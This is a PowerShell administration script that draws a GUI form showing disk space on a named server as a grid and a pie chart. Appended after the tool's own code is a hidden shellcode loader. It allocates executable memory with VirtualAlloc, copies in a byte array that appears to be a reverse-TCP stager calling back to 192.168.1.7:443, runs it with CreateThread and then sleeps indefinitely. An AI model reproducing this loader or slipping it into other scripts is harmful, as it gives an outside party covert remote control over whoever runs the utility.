






function OnApplicationLoad {
 
 if([Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms.DataVisualization") -eq $null)
 {
  
  [void][reflection.assembly]::Load("System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
  [void][System.Windows.Forms.MessageBox]::Show("Microsoft Chart Controls for Microsoft .NET 3.5 Framework is required","Microsoft Chart Controls Required")
  
  [System.Diagnostics.Process]::Start("http://www.microsoft.com/downloads/en/details.aspx?familyid=130F7986-BF49-4FE5-9CA8-910AE6EA442C&displaylang=en");
  return $false
 }
 
 return $true 
}

function OnApplicationExit {
 
 
 
 
 $script:ExitCode = 0 
}






function Call-SystemInformation_pff {

 
 
 
 [void][reflection.assembly]::Load("System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
 [void][reflection.assembly]::Load("System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
 [void][reflection.assembly]::Load("System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
 [void][reflection.assembly]::Load("System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a")
 [void][reflection.assembly]::Load("mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
 [void][reflection.assembly]::Load("System.Windows.Forms.DataVisualization, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35")
 

 
 
 
    [System.Windows.Forms.Application]::EnableVisualStyles()
    $formDiskSpacePieChart = New-Object System.Windows.Forms.Form
    $dataGrid1 = New-Object System.Windows.Forms.DataGrid 
    $chart1 = New-Object System.Windows.Forms.DataVisualization.Charting.Chart
    $InitialFormWindowState = New-Object System.Windows.Forms.FormWindowState
    $btnRefresh = New-Object System.Windows.Forms.Button
    $btngetdata=New-Object System.Windows.Forms.Button
	$rtbPerfData = New-Object System.Windows.Forms.RichTextBox
	$lblServicePack = New-Object System.Windows.Forms.Label
    $lblDBName= New-Object System.Windows.Forms.Label
	$lblOS = New-Object System.Windows.Forms.Label
	$statusBar1 = New-Object System.Windows.Forms.StatusBar
	$btnClose = New-Object System.Windows.Forms.Button
	$InitialFormWindowState = New-Object System.Windows.Forms.FormWindowState
    $txtComputerName = New-Object System.Windows.Forms.TextBox
    $dataGrid1 = New-Object System.Windows.Forms.DataGrid 

 
 function Load-Chart
 {
  Param( 
   [Parameter(Position=1,Mandatory=$true)]
     [System.Windows.Forms.DataVisualization.Charting.Chart]$ChartControl
   ,
   [Parameter(Position=2,Mandatory=$true)]
     $XPoints
   ,
   [Parameter(Position=3,Mandatory=$true)]
     $YPoints
   ,
   [Parameter(Position=4,Mandatory=$false)]
     [string]$XTitle
   ,
   [Parameter(Position=5,Mandatory=$false)]
     [string]$YTitle
   ,
   [Parameter(Position=6,Mandatory=$false)]
     [string]$Title
   ,
   [Parameter(Position=7,Mandatory=$false)]
     [System.Windows.Forms.DataVisualization.Charting.SeriesChartType]$ChartType
   ,
   [Parameter(Position=8,Mandatory=$false)]
     $SeriesIndex = 0
   ,
   [Parameter(Position=9,Mandatory=$false)]
     $TitleIndex = 0,
   [switch]$Append)
 
  $ChartAreaIndex = 0
  if($Append)
  {
   $name = "ChartArea " + ($ChartControl.ChartAreas.Count + 1).ToString();
   $ChartArea = $ChartControl.ChartAreas.Add($name)
   $ChartAreaIndex = $ChartControl.ChartAreas.Count - 1
   
   $name = "Series " + ($ChartControl.Series.Count + 1).ToString();
   $Series = $ChartControl.Series.Add($name) 
   $SeriesIndex = $ChartControl.Series.Count - 1
 
   $Series.ChartArea = $ChartArea.Name
   
   if($Title)
   {
    $name = "Title " + ($ChartControl.Titles.Count + 1).ToString();
    $TitleObj = $ChartControl.Titles.Add($name)
    $TitleIndex = $ChartControl.Titles.Count - 1 
    $TitleObj.DockedToChartArea = $ChartArea.Name
    $TitleObj.IsDockedInsideChartArea = $false
   }
  }
  else
  {
   if($ChartControl.ChartAreas.Count -eq  0)
   {
    $name = "ChartArea " + ($ChartControl.ChartAreas.Count + 1).ToString();
    [void]$ChartControl.ChartAreas.Add($name)
    $ChartAreaIndex = $ChartControl.ChartAreas.Count - 1
   } 
   
   if($ChartControl.Series.Count -eq 0)
   {
    $name = "Series " + ($ChartControl.Series.Count + 1).ToString();
    $Series = $ChartControl.Series.Add($name) 
    $SeriesIndex = $ChartControl.Series.Count - 1
    $Series.ChartArea = $ChartControl.ChartAreas[0].Name
   }
  }
  
  $Series = $ChartControl.Series[$SeriesIndex]
  $ChartArea = $ChartControl.ChartAreas[$Series.ChartArea]
  
  $Series.Points.Clear()
  
  if($Title)
  {
   if($ChartControl.Titles.Count -eq 0)
   {
    $name = "Title " + ($ChartControl.Titles.Count + 1).ToString();
    [void]$ChartControl.Titles.Add($name)
    $TitleIndex = $ChartControl.Titles.Count - 1
    $TitleObj.DockedToChartArea = $ChartArea.Name
    $TitleObj.IsDockedInsideChartArea = $false
   }
   
   $ChartControl.Titles[$TitleIndex].Text = $Title
  }
  
  if($ChartType)
  {
   $Series.ChartType = $ChartType
  }
  
  if($XTitle)
  {
   $ChartArea.AxisX.Title = $XTitle
  }
  
  if($YTitle)
  {
   $ChartArea.AxisY.Title = $YTitle
  }
  
  if($XPoints -isnot [Array] -or $XPoints -isnot [System.Collections.IEnumerable])
  {
   $array = New-Object System.Collections.ArrayList
   $array.Add($XPoints)
   $XPoints = $array
  }
  
  if($YPoints -isnot [Array] -or $YPoints -isnot [System.Collections.IEnumerable])
  {
   $array = New-Object System.Collections.ArrayList
   $array.Add($YPoints)
   $YPoints = $array
  }
  
  $Series.Points.DataBindXY($XPoints, $YPoints)
 
 }
 
 function Clear-Chart
 {
  Param (  
  [Parameter(Position=1,Mandatory=$true)]
    [System.Windows.Forms.DataVisualization.Charting.Chart]$ChartControl
  ,
  [Parameter(Position=2, Mandatory=$false)]
  [Switch]$LeaveSingleChart
  )
  
  $count = 0 
  if($LeaveSingleChart)
  {
   $count = 1
  }
  
  while($ChartControl.Series.Count -gt $count)
  {
   $ChartControl.Series.RemoveAt($ChartControl.Series.Count - 1)
  }
  
  while($ChartControl.ChartAreas.Count -gt $count)
  {
   $ChartControl.ChartAreas.RemoveAt($ChartControl.ChartAreas.Count - 1)
  }
  
  while($ChartControl.Titles.Count -gt $count)
  {
   $ChartControl.Titles.RemoveAt($ChartControl.Titles.Count - 1)
  }
  
  if($ChartControl.Series.Count -gt 0)
  {
   $ChartControl.Series[0].Points.Clear()
  }
 }
 


 
 function Load-PieChart
 {
param(
[string[]]$servers = "$ENV:COMPUTERNAME"
)
  foreach ($server in $servers) {
  
  $Disks = @(Get-WMIObject -Namespace "root\cimv2" -class Win32_LogicalDisk -Impersonation 3 -ComputerName $server -filter "DriveType=3" )
   
  
  Clear-Chart $chart1
  
  
  foreach($disk in $Disks)
  { 
   $UsedSpace =(($disk.size - $disk.freespace)/1gb)
   $FreeSpace = ($disk.freespace/1gb)
 
   
   Load-Chart $chart1 -XPoints ("Used ({0:N1} GB)" -f $UsedSpace), ("Free Space ({0:N1} GB)" -f $FreeSpace) -YPoints $UsedSpace, $FreeSpace -ChartType "Bar" -Title ("Volume: {0} ({1:N1} GB)" -f $disk.deviceID, ($disk.size/1gb) ) -Append 
  }
  
  
  foreach ($Series in $chart1.Series)
  {
   $Series.CustomProperties = "PieDrawingStyle=Concave"
  }
 }
 }


function Get-DiskDetails
{
param(
[string[]]$ComputerName = $env:COMPUTERNAME
)
$Object =@()
$array = New-Object System.Collections.ArrayList      
foreach ($Computer in $ComputerName) {
if(Test-Connection -ComputerName $Computer -Count 1 -ea 0) {
Write-Verbose "$Computer online"
$D=Get-WmiObject win32_logicalDisk -ComputerName $Computer  |where {$_.DriveType -eq 3}|select-object DeviceID, VolumeName,FreeSpace,Size 
foreach($disk in $D)
{
$TotalSize = $Disk.Size /1Gb -as [int]
$InUseSize = ($Disk.Size /1Gb -as [int]) – ($Disk.Freespace / 1Gb -as [int])
$FreeSpaceGB = $Disk.Freespace / 1Gb -as [int]
$FreeSpacePer = ((($Disk.Freespace /1Gb -as [float]) / ($Disk.Size / 1Gb -as [float]))*100) -as [int]

$Object += New-Object PSObject -Property @{
Name= $Computer;
Drive= $Disk.DeviceID;
Label=$Disk.VolumeName;
SizeGB=$TotalSize;
UseGB=$InUseSize;
FreeGB=$FreeSpaceGB;
'% Free' =$FreeSpacePer;
}
}
}
}


$array.AddRange($Object) 
$dataGrid1.DataSource = $array 

}

 $GetData={
	    if ($txtComputerName.text -eq '')
        {
        $txtComputerName.text =$env:COMPUTERNAME
        }
        $statusBar1.text="Getting Disk Space Details Data..please wait"
        if(Test-Connection -ComputerName $txtComputerName.text -Count 1 -ea 0) { 
        $data=Get-DiskDetails -ComputerName $txtComputerName.text | Out-String
        Load-PieChart -servers $txtComputerName.text 
        }
        else
        {
        [Windows.Forms.MessageBox]::Show(“Not able connect to the server", [Windows.Forms.MessageBoxIcon]::Information)
        }
        
        $errorActionPreference="Continue"
	    $statusBar1.Text="Ready"
        
	
	}
	
  
	$Close={
	    $formDiskSpacePieChart.close()
	
	}
 
 
 
 
 
 $Form_StateCorrection_Load=
 {
  
  $formDiskSpacePieChart.WindowState = $InitialFormWindowState
 }

 
 
 
 
 
 
 $formDiskSpacePieChart.Controls.Add($buttonSave)
 $formDiskSpacePieChart.Controls.Add($chart1)
 $formDiskSpacePieChart.ClientSize = New-Object System.Drawing.Size(513,540)
 $formDiskSpacePieChart.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
 $formDiskSpacePieChart.MinimumSize = New-Object System.Drawing.Size(300,300)
 $formDiskSpacePieChart.Name = "formDiskSpacePieChart"
 $formDiskSpacePieChart.Text = "Disk Space Pie Chart"
 $formDiskSpacePieChart.Controls.Add($btnRefresh)
 $formDiskSpacePieChart.Controls.Add($lblServicePack)
 $formDiskSpacePieChart.Controls.Add($lblOS)
 $formDiskSpacePieChart.Controls.Add($lblDBName)
 $formDiskSpacePieChart.Controls.Add($statusBar1)
 $formDiskSpacePieChart.Controls.Add($btnClose)
 $formDiskSpacePieChart.Controls.Add($txtComputerName)
 $formDiskSpacePieChart.ClientSize = New-Object System.Drawing.Size(630,600)
 $formDiskSpacePieChart.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
 $formDiskSpacePieChart.Name = "form1"
 $formDiskSpacePieChart.Text = "Disk Space Usage Information"
 $formDiskSpacePieChart.add_Load($PopulateList)
 $formDiskSpacePieChart.add_Load($FormEvent_Load)

 
$System_Drawing_Size = New-Object System.Drawing.Size 
$System_Drawing_Size.Width = 600 
$System_Drawing_Size.Height = 125
$dataGrid1.Size = $System_Drawing_Size 
$dataGrid1.DataBindings.DefaultDataSourceUpdateMode = 0 
$dataGrid1.HeaderForeColor = [System.Drawing.Color]::FromArgb(255,0,0,0) 
$dataGrid1.Name = "dataGrid1" 
$dataGrid1.DataMember = "" 
$dataGrid1.TabIndex = 0 
$System_Drawing_Point = New-Object System.Drawing.Point 
$System_Drawing_Point.X =13 
$System_Drawing_Point.Y = 62
$dataGrid1.Location = $System_Drawing_Point 
 
$formDiskSpacePieChart.Controls.Add($dataGrid1) 
$dataGrid1.CaptionText='Disk Details'

	
	
	
	$btnRefresh.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
	$btnRefresh.Enabled = $TRUE
	$btnRefresh.Location = New-Object System.Drawing.Point(230,35)
	$btnRefresh.Name = "btnRefresh"
	$btnRefresh.Size = New-Object System.Drawing.Size(95,20)
	$btnRefresh.TabIndex = 2
	$btnRefresh.Text = "GetDiskSpace"
	$btnRefresh.UseVisualStyleBackColor = $True
	$btnRefresh.add_Click($GetData)
    
    
 
    
	
    
	$btnClose.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
	$btngetdata.Enabled = $TRUE
    $btnClose.Location = New-Object System.Drawing.Point(373,35)
	$btnClose.Name = "btnClose"
	$btnClose.Size = New-Object System.Drawing.Size(95,20)
	$btnClose.TabIndex = 3
	$btnClose.Text = "Close"
	$btnClose.UseVisualStyleBackColor = $True
	$btnClose.add_Click($Close)
	
    
    
	
	$lblDBName.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
	$lblDBName.Font = New-Object System.Drawing.Font("Lucida Console",8.25,1,3,1)
	$lblDBName.Location = New-Object System.Drawing.Point(13,10)
	$lblDBName.Name = "lblDBName"
	$lblDBName.Size = New-Object System.Drawing.Size(178,23)
	$lblDBName.TabIndex = 0
	$lblDBName.Text = "Enter Server Name "
	$lblDBName.Visible = $TRUE
    
    
	
    
    $txtComputerName.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
    $txtComputerName.Location = New-Object System.Drawing.Point(13, 35)
    $txtComputerName.Name = "txtComputerName"
    $txtComputerName.TabIndex = 1
    $txtComputerName.Size = New-Object System.Drawing.Size(200,70)
    $txtComputerName.visible=$TRUE
	
	
	
	$lblServicePack.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
	$lblServicePack.Font = New-Object System.Drawing.Font("Lucida Console",8.25,1,3,1)
	$lblServicePack.Location = New-Object System.Drawing.Point(13,100)
	$lblServicePack.Name = "lblServicePack"
	$lblServicePack.Size = New-Object System.Drawing.Size(278,23)
	$lblServicePack.TabIndex = 0
	$lblServicePack.Text = "ServicePack"
	$lblServicePack.Visible = $False
	
	
	
	$lblOS.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
	$lblOS.Font = New-Object System.Drawing.Font("Lucida Console",8.25,1,3,1)
	$lblOS.Location = New-Object System.Drawing.Point(12,77)
	$lblOS.Name = "lblOS"
	$lblOS.Size = New-Object System.Drawing.Size(278,23)
	$lblOS.TabIndex = 2
	$lblOS.Text = "Service Information"
	$lblOS.Visible = $False
	
	
	
	$statusBar1.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
	$statusBar1.Location = New-Object System.Drawing.Point(0,365)
	$statusBar1.Name = "statusBar1"
	$statusBar1.Size = New-Object System.Drawing.Size(390,22)
	$statusBar1.TabIndex = 5
	$statusBar1.Text = "statusBar1"


 
 
 
 $chart1.Anchor = [System.Windows.Forms.AnchorStyles]::Top -bor [System.Windows.Forms.AnchorStyles]::Bottom -bor [System.Windows.Forms.AnchorStyles]::Left -bor [System.Windows.Forms.AnchorStyles]::Right 
 $chart1.BackGradientStyle = [System.Windows.Forms.DataVisualization.Charting.GradientStyle]::TopBottom 
 $System_Windows_Forms_DataVisualization_Charting_ChartArea_1 = New-Object System.Windows.Forms.DataVisualization.Charting.ChartArea
 $System_Windows_Forms_DataVisualization_Charting_ChartArea_1.Area3DStyle.Enable3D = $True
 $System_Windows_Forms_DataVisualization_Charting_ChartArea_1.AxisX.Title = "Disk"
 $System_Windows_Forms_DataVisualization_Charting_ChartArea_1.AxisY.Title = "Disk Space (MB)"
 $System_Windows_Forms_DataVisualization_Charting_ChartArea_1.Name = "ChartArea1"

 [void]$chart1.ChartAreas.Add($System_Windows_Forms_DataVisualization_Charting_ChartArea_1)
 $chart1.DataBindings.DefaultDataSourceUpdateMode = [System.Windows.Forms.DataSourceUpdateMode]::OnValidation 
 $chart1.Location = New-Object System.Drawing.Point(13,200)
 $chart1.Name = "chart1"
 $System_Windows_Forms_DataVisualization_Charting_Series_2 = New-Object System.Windows.Forms.DataVisualization.Charting.Series
 $System_Windows_Forms_DataVisualization_Charting_Series_2.ChartArea = "ChartArea1"
 $System_Windows_Forms_DataVisualization_Charting_Series_2.ChartType = [System.Windows.Forms.DataVisualization.Charting.SeriesChartType]::Pie 
 $System_Windows_Forms_DataVisualization_Charting_Series_2.CustomProperties = "DrawingStyle=Cylinder, PieDrawingStyle=Concave"
 $System_Windows_Forms_DataVisualization_Charting_Series_2.IsVisibleInLegend = $False
 $System_Windows_Forms_DataVisualization_Charting_Series_2.Legend = "Legend1"
 $System_Windows_Forms_DataVisualization_Charting_Series_2.Name = "Disk Space"

 [void]$chart1.Series.Add($System_Windows_Forms_DataVisualization_Charting_Series_2)
 $chart1.Size = New-Object System.Drawing.Size(600,350)
 $chart1.TabIndex = 0
 $chart1.Text = "chart1"
 $System_Windows_Forms_DataVisualization_Charting_Title_3 = New-Object System.Windows.Forms.DataVisualization.Charting.Title
 $System_Windows_Forms_DataVisualization_Charting_Title_3.Alignment = [System.Drawing.ContentAlignment]::TopCenter 
 $System_Windows_Forms_DataVisualization_Charting_Title_3.DockedToChartArea = "ChartArea1"
 $System_Windows_Forms_DataVisualization_Charting_Title_3.IsDockedInsideChartArea = $False
 $System_Windows_Forms_DataVisualization_Charting_Title_3.Name = "Title1"
 $System_Windows_Forms_DataVisualization_Charting_Title_3.Text = "Disk Space"

 [void]$chart1.Titles.Add($System_Windows_Forms_DataVisualization_Charting_Title_3)
 

 
 $InitialFormWindowState = $formDiskSpacePieChart.WindowState
 
 $formDiskSpacePieChart.add_Load($Form_StateCorrection_Load)
 
 return $formDiskSpacePieChart.ShowDialog()

} 


if(OnApplicationLoad -eq $true)
{
	
	
    
    Call-SystemInformation_pff | Out-Null
	
	OnApplicationExit
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x07,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

